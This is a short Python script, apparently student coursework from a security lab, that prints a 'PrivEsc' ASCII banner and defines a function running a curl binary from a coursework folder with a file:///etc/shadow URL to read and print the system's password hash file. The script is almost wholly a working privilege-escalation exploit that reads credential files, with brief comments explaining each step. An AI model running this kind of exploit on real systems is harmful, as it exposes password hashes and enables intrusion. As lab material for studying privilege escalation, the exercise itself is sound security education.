import os                                                        
                                                               
print("________                          __________                   ")
print("`MMMMMMMb.         68b            `MMMMMMMMM                   ")
print(" MM    `Mb         Y89             MM      \                   ")
print(" MM     MM ___  __ ___ ____    ___ MM          ____     ____   ")
print(" MM     MM `MM 6MM `MM `MM(    )M' MM    ,    6MMMMb\  6MMMMb. ")
print(" MM    .M9  MM69 '  MM  `Mb    d'  MMMMMMM   MM'    ` 6M'   Mb ")
print(" MMMMMMM9'  MM'     MM   YM.  ,P   MM    `   YM.      MM    `' ")
print(" MM         MM      MM    MM  M    MM         YMMMMb  MM       ")
print(" MM         MM      MM    `Mbd'    MM             `Mb MM       ")
print(" MM         MM      MM     YMP     MM      / L    ,MM YM.   d9 ")
print("_MM_       _MM_    _MM_     M     _MMMMMMMMM MYMMMM9   YMMMM9  ")
                                                               
def Priv_Esc():

  process=os.popen('/home/student/LeapCW/curl "file:///etc/shadow"')
#Runs command exploiting the curl package.
  output=process.read()
#Reads the output of the exploit.
  print(output)
#Prints output in terminsl